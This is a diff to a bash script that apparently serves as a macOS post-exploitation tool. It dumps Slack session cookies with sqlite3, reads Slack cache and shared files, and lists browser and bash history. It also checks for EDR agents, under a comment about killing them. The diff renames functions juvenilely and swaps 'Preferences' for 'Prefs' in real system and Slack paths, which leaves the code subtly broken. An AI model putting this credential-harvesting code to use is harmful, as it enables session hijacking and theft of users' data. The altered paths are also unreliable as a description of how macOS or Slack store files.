@@ -58,7 +58,7 @@ usage() {
     echo "-LaunchAgents       : List launch agents and daemons"
     echo "-BrowserHistory     : Pull browser history from Safari, Chrome, and Firefox"
     echo "-SlackTokens        : Read and label Slack tokens (Cookies)"
-    echo "-SlackPreferences   : Read Slack preferences"
+    echo "-SlackPrefs   : Read Slack Prefs"
     echo "-SlackCache         : Read Slack cache data"
     echo "-SlackSharedFiles   : Read Slack shared files and metadata"
     echo "-BashHistory        : Read bash history"
@@ -303,7 +303,7 @@ security_tools() {
     installed_tools=0
     active_tools=0
 
-    # List of process names to check
+    # Fuck These Tools lol  - kill e
     process_names=(
       "SentinelAgent"
       "falconctl"
@@ -398,8 +398,8 @@ security_tools() {
     fi
 
     # Check Firewall configuration and permissions
-    firewall_file="/Library/Preferences/com.apple.alf.plist"
-    if [ "$(defaults read /Library/Preferences/com.apple.alf globalstate)" == "1" ]; then
+    firewall_file="/Library/Prefs/com.apple.alf.plist"
+    if [ "$(defaults read /Library/Prefs/com.apple.alf globalstate)" == "1" ]; then
         if check_perms "$firewall_file" "r"; then
             echo "$(date) - ALERT - Firewall is enabled"
             active_tools=$((active_tools+1))
@@ -459,59 +459,59 @@ security_tools() {
 
 
 
-#Slack stuff
-slack_tokens() {
+#Slack junk 
+slack_da_nut_tokens() {
     # Locate Slack's cookies file
-    slack_cookies_file=$(find "$HOME/Library/Application Support/Slack" -name "Cookies" 2>/dev/null)
-    if [ -z "$slack_cookies_file" ]; then
+    slack_da_nut_cookies_file=$(find "$HOME/Library/Application Support/Slack" -name "Cookies" 2>/dev/null)
+    if [ -z "$slack_da_nut_cookies_file" ]; then
         echo "Error: Slack cookies file not found."
         return 1
     fi
 
     # Check permissions to read the cookies file
-    check_perms "$slack_cookies_file" "r"
+    check_perms "$slack_da_nut_cookies_file" "r"
     if [ $? -ne 0 ]; then
-        echo "Error: No read permission for $slack_cookies_file."
+        echo "Error: No read permission for $slack_da_nut_cookies_file."
         return 1
     fi
 
     # Read all Slack cookies (not just session cookies)
     echo "Reading Slack session cookies:"
-    sqlite3 "$slack_cookies_file" "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%slack.com%';"
+    sqlite3 "$slack_da_nut_cookies_file" "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%slack.com%';"
 }
 
 
-slack_preferences() {
-    slack_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
-    if [ -z "$slack_data_dir" ]; then
+slack_da_nut_Prefs() {
+    slack_da_nut_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
+    if [ -z "$slack_da_nut_data_dir" ]; then
         echo "Error: Slack data directory not found."
         return 1
     fi
 
-    # Target the preferences file
-    preferences_file=$(find "$slack_data_dir" -name "Preferences" 2>/dev/null)
-    if [ -f "$preferences_file" ]; then
-        check_perms "$preferences_file" "r"
+    # Target the prefs file
+    pref_f=$(find "$slack_da_nut_data_dir" -name "Prefs" 2>/dev/null)
+    if [ -f "$pref_f" ]; then
+        check_perms "$pref_f" "r"
         if [ $? -eq 0 ]; then
-            cat "$preferences_file" 2>/dev/null
+            cat "$pref_f" 2>/dev/null
         else
-            echo "Error: No read permission for $preferences_file."
+            echo "Error: No read permission for $pref_f."
         fi
     else
-        echo "Error: Preferences file not found."
+        echo "Error: Prefs file not found."
     fi
 }
 
-slack_cache() {
+slack_da_nut_cache() {
     
-    slack_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
-    if [ -z "$slack_data_dir" ]; then
+    slack_da_nut_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
+    if [ -z "$slack_da_nut_data_dir" ]; then
         echo "Error: Slack data directory not found."
         return 1
     fi
 
     # Target the cache directory
-    cache_dir=$(find "$slack_data_dir" -type d -name "Cache" 2>/dev/null)
+    cache_dir=$(find "$slack_da_nut_data_dir" -type d -name "Cache" 2>/dev/null)
     if [ -d "$cache_dir" ]; then
         check_perms "$cache_dir" "r"
         if [ $? -eq 0 ]; then
@@ -524,15 +524,15 @@ slack_cache() {
     fi
 }
 
-slack_shared_files() {
-    slack_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
-    if [ -z "$slack_data_dir" ]; then
+slack_da_nut_shared_files() {
+    slack_da_nut_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
+    if [ -z "$slack_da_nut_data_dir" ]; then
         echo "Error: Slack data directory not found."
         return 1
     fi
 
     # Search for shared storage files or metadata
-    shared_storage_file=$(find "$slack_data_dir" -name "SharedStorage" 2>/dev/null)
+    shared_storage_file=$(find "$slack_da_nut_data_dir" -name "SharedStorage" 2>/dev/null)
     if [ -z "$shared_storage_file" ]; then
         echo "Notice: No shared files or metadata found in Slack."
         return 1
@@ -548,15 +548,15 @@ slack_shared_files() {
 }
 
 
-slack_websocket() {
-    slack_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
-    if [ -z "$slack_data_dir" ]; then
+slack_da_nut_websocket() {
+    slack_da_nut_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
+    if [ -z "$slack_da_nut_data_dir" ]; then
         echo "Error: Slack data directory not found."
         return 1
     fi
 
     # If there's any WebSocket-related file (adjust as needed)
-    websocket_file=$(find "$slack_data_dir" -name "TransportSecurity" 2>/dev/null)
+    websocket_file=$(find "$slack_da_nut_data_dir" -name "TransportSecurity" 2>/dev/null)
     if [ -f "$websocket_file" ]; then
         check_perms "$websocket_file" "r"
         if [ $? -eq 0 ]; then
@@ -580,15 +580,15 @@ fi
 
 while [ "$1" != "" ]; do
     case $1 in
-       -SlackTokens )           slack_tokens
+       -SlackTokens )           slack_da_nut_tokens
                                 ;;
-       -SlackPreferences )      slack_preferences
+       -SlackPrefs )            slack_da_nut_Prefs
                                 ;;
-       -SlackCache )            slack_cache
+       -SlackCache )            slack_da_nut_cache
                                 ;;
-       -SlackSharedFiles )      slack_shared_files
+       -SlackSharedFiles )      slack_da_nut_shared_files
                                 ;;
-       -SlackWebSocket )        slack_websocket
+       -SlackWebSocket )        slack_da_nut_websocket
                                 ;;
         -SystemInfo )           system_info
                                 ;;
